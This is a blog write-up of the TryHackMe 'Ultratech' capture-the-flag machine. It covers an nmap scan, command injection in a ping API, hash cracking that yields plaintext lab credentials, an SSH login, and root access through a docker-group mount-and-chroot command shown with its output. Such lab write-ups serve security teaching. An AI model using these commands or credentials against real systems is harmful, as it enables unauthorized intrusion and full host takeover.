---
title: Ultratech
categories: [THM]
tags: [boot2root]
---

# Machine Information

- [Ultratech](https://tryhackme.com/room/ultratech1)

## Host discovery

- target IP: `10.10.199.168`

## Information Gathering

Nmap Time

```bash
nmap -p- -T4 10.10.199.168 -A -oA 10.10.199.168
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-13 15:31 +08
Stats: 0:04:11 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 47.79% done; ETC: 15:40 (0:04:27 remaining)
Nmap scan report for 10.10.199.168
Host is up (0.19s latency).
Not shown: 65531 closed tcp ports (reset)
PORT      STATE SERVICE VERSION
21/tcp    open  ftp     vsftpd 3.0.3
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 dc:66:89:85:e7:05:c2:a5:da:7f:01:20:3a:13:fc:27 (RSA)
|   256 c3:67:dd:26:fa:0c:56:92:f3:5b:a0:b3:8d:6d:20:ab (ECDSA)
|_  256 11:9b:5a:d6:ff:2f:e4:49:d2:b5:17:36:0e:2f:1d:2f (ED25519)
8081/tcp  open  http    Node.js Express framework
|_http-cors: HEAD GET POST PUT DELETE PATCH
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
31331/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: UltraTech - The best of technology (AI, FinTech, Big Data)
|_http-server-header: Apache/2.4.29 (Ubuntu)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94SVN%E=4%D=2/13%OT=21%CT=1%CU=41272%PV=Y%DS=2%DC=T%G=Y%TM=65CB
OS:1D3B%P=x86_64-pc-linux-gnu)SEQ(SP=107%GCD=1%ISR=10A%TI=Z%CI=I%II=I%TS=A)
OS:OPS(O1=M508ST11NW6%O2=M508ST11NW6%O3=M508NNT11NW6%O4=M508ST11NW6%O5=M508
OS:ST11NW6%O6=M508ST11)WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)
OS:ECN(R=Y%DF=Y%T=40%W=6903%O=M508NNSNW6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%
OS:F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T
OS:5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=
OS:Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF
OS:=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40
OS:%CD=S)

Network Distance: 2 hops
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 8080/tcp)
HOP RTT       ADDRESS
1   192.25 ms 10.8.0.1
2   192.43 ms 10.10.199.168

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 621.18 seconds
```

## Exploiting Port 31331 & 8081

![](/assets/img/posts/2024-02-13-ultratech/2024-02-13-ultratech-15-55-49.png)

I started out by looking for interesting information.

![](/assets/img/posts/2024-02-13-ultratech/2024-02-13-ultratech-15-59-30.png)

I found a robots.txt. Time to check the link and see what it is about.

![](/assets/img/posts/2024-02-13-ultratech/2024-02-13-ultratech-16-01-29.png)

After going to the directory pointed out by robots.txt, I then managed to get this partners.html. Lets try and see what I could do with it. After trying a few times, the login page will send a get request to PORT 8081 which is the API for ultratech. time to look into the API as well. Based on the nmap result for PORT 8081, it allows PUT method which I could upload a file. 


```bash
curl -IX OPTIONS http://10.10.199.168:8081                                                                                                
HTTP/1.1 204 No Content
X-Powered-By: Express
Access-Control-Allow-Origin: *
Access-Control-Allow-Methods: GET,HEAD,PUT,PATCH,POST,DELETE
Vary: Access-Control-Request-Headers
Content-Length: 0
Date: Tue, 13 Feb 2024 08:07:38 GMT
Connection: keep-alive
```

I then tried to upload and see if its possible. It is not possible to upload. I then tried to intercept the request of both ports and found something interesting.

![](/assets/img/posts/2024-02-13-ultratech/2024-02-13-ultratech-16-13-28.png)

This seems like a result from ping command in linux. I then tried to perform command injection.

![](/assets/img/posts/2024-02-13-ultratech/2024-02-13-ultratech-16-16-57.png)

Although I could not get a good result, I still managed to get a good command injection. I then tried to get a reverse shell to check what's in it.

![](/assets/img/posts/2024-02-13-ultratech/2024-02-13-ultratech-16-22-50.png)

I could not get a reverse shell but I could read some information. I then tried to read the sqlite database.

![](/assets/img/posts/2024-02-13-ultratech/2024-02-13-ultratech-16-24-48.png)

I somehow able to read the sqlite database. Although it has some weird characters, I managed to understand and retrieve the useful information. It seems like a username and a password hashes. Lets try to crack online.

```bash
admin:0d0ea5111e3c1def594c1684e3b9be84:mrsheafy
r00t:f357a0c52799563c7c7b76c1e7543a32:n100906
```

After cracking it, I managed to get 2 usernames and passwords. I then tried to login into the API.

![](/assets/img/posts/2024-02-13-ultratech/2024-02-13-ultratech-16-45-56.png)

After login into the API, here's the only thing that I have. But now that I have credentials, I could try to access both FTP and SSH with the same credentials.

## Exploiting Port 22

by using `r00t:n100906`, I managed to access the SSH.

```bash
ssh r00t@10.10.40.147        
The authenticity of host '10.10.40.147 (10.10.40.147)' can't be established.
ED25519 key fingerprint is SHA256:g5I2Aq/2um35QmYfRxNGnjl3zf9FNXKPpEHxMLlWXMU.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.40.147' (ED25519) to the list of known hosts.
r00t@10.10.40.147's password: 
Welcome to Ubuntu 18.04.2 LTS (GNU/Linux 4.15.0-46-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Tue Feb 13 08:52:45 UTC 2024

  System load:  0.08               Processes:           97
  Usage of /:   24.3% of 19.56GB   Users logged in:     0
  Memory usage: 69%                IP address for eth0: 10.10.40.147
  Swap usage:   0%

 * Ubuntu's Kubernetes 1.14 distributions can bypass Docker and use containerd
   directly, see https://bit.ly/ubuntu-containerd or try it now with

     snap install microk8s --channel=1.14/beta --classic

1 package can be updated.
0 updates are security updates.



The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

r00t@ultratech-prod:~$ 
```

## Privilege Escalation

Since I managed to get a shell, it is time to perform privilege escalation. I started out with the simplest option, sudo privileges. 

```bash
r00t@ultratech-prod:~$ sudo -l
[sudo] password for r00t: 
Sorry, user r00t may not run sudo on ultratech-prod.
r00t@ultratech-prod:~$ id
uid=1001(r00t) gid=1001(r00t) groups=1001(r00t),116(docker)
```

Although I do not have sudo privileges, I noticed that I am in docker groups. After researching, it is possible to get root account if Im in docker group.

![](/assets/img/posts/2024-02-13-ultratech/2024-02-13-ultratech-16-57-54.png)

According to GTFObin, I could just spawn a shell with docker command. Lets try it out. 

```bash
r00t@ultratech-prod:~$ docker run -v /:/mnt --rm -it alpine chroot /mnt sh
id
whoami
Unable to find image 'alpine:latest' locally
^C
r00t@ultratech-prod:~$ docker ps
CONTAINER ID        IMAGE               COMMAND             CREATED             STATUS              PORTS               NAMES
r00t@ultratech-prod:~$ docker image ls
REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE
bash                latest              495d6437fc1e        4 years ago         15.8MB
```

Although I could not get shell with the command given, I somehow understand as it could not find the image locally. I then tried to change the command and let it work.

```bash
r00t@ultratech-prod:~$ docker run -v /:/mnt --rm -it bash chroot /mnt sh
# id
uid=0(root) gid=0(root) groups=0(root),1(daemon),2(bin),3(sys),4(adm),6(disk),10(uucp),11,20(dialout),26(tape),27(sudo)
# ls -la
total 2017380
drwxr-xr-x  23 root root       4096 Mar 19  2019 .
drwxr-xr-x  23 root root       4096 Mar 19  2019 ..
drwxr-xr-x   2 root root       4096 Mar 22  2019 bin
drwxr-xr-x   3 root root       4096 Mar 22  2019 boot
drwxr-xr-x  17 root root       3700 Feb 13 08:37 dev
drwxr-xr-x 101 root root       4096 Mar 22  2019 etc
drwxr-xr-x   5 root root       4096 Mar 22  2019 home
lrwxrwxrwx   1 root root         33 Mar 19  2019 initrd.img -> boot/initrd.img-4.15.0-46-generic
lrwxrwxrwx   1 root root         33 Mar 19  2019 initrd.img.old -> boot/initrd.img-4.15.0-46-generic
drwxr-xr-x  23 root root       4096 Mar 22  2019 lib
drwxr-xr-x   2 root root       4096 Feb 14  2019 lib64
drwx------   2 root root      16384 Mar 19  2019 lost+found
drwxr-xr-x   2 root root       4096 Feb 14  2019 media
drwxr-xr-x   2 root root       4096 Feb 14  2019 mnt
drwxr-xr-x   3 root root       4096 Mar 22  2019 opt
dr-xr-xr-x 114 root root          0 Feb 13 08:36 proc
drwx------   6 root root       4096 Mar 22  2019 root
drwxr-xr-x  30 root root       1040 Feb 13 08:58 run
drwxr-xr-x   2 root root      12288 Mar 22  2019 sbin
drwxr-xr-x   4 root root       4096 Mar 19  2019 snap
drwxr-xr-x   3 root root       4096 Mar 22  2019 srv
-rw-------   1 root root 2065694720 Mar 19  2019 swap.img
dr-xr-xr-x  13 root root          0 Feb 13 08:36 sys
drwxrwxrwt  10 root root       4096 Feb 13 09:00 tmp
drwxr-xr-x  10 root root       4096 Feb 14  2019 usr
drwxr-xr-x  14 root root       4096 Mar 19  2019 var
lrwxrwxrwx   1 root root         30 Mar 19  2019 vmlinuz -> boot/vmlinuz-4.15.0-46-generic
lrwxrwxrwx   1 root root         30 Mar 19  2019 vmlinuz.old -> boot/vmlinuz-4.15.0-46-generic
# ls -la ;/roo^H^H^H^H^H^C
# bash
groups: cannot find name for group ID 11
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

root@ca3db2d277fc:/# id
uid=0(root) gid=0(root) groups=0(root),1(daemon),2(bin),3(sys),4(adm),6(disk),10(uucp),11,20(dialout),26(tape),27(sudo)
root@ca3db2d277fc:/# ls -la /root
total 40
drwx------  6 root root 4096 Mar 22  2019 .
drwxr-xr-x 23 root root 4096 Mar 19  2019 ..
-rw-------  1 root root  844 Mar 22  2019 .bash_history
-rw-r--r--  1 root root 3106 Apr  9  2018 .bashrc
drwx------  2 root root 4096 Mar 22  2019 .cache
drwx------  3 root root 4096 Mar 22  2019 .emacs.d
drwx------  3 root root 4096 Mar 22  2019 .gnupg
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-rw-------  1 root root    0 Mar 22  2019 .python_history
drwx------  2 root root 4096 Mar 22  2019 .ssh
-rw-rw-rw-  1 root root  193 Mar 22  2019 private.txt
root@ca3db2d277fc:/# cat /root/private.txt
# Life and acomplishments of Alvaro Squalo - Tome I

Memoirs of the most successful digital nomdad finblocktech entrepreneur
in the world.

By himself.

## Chapter 1 - How I became successful

```

With that, I managed to get root by using docker. 

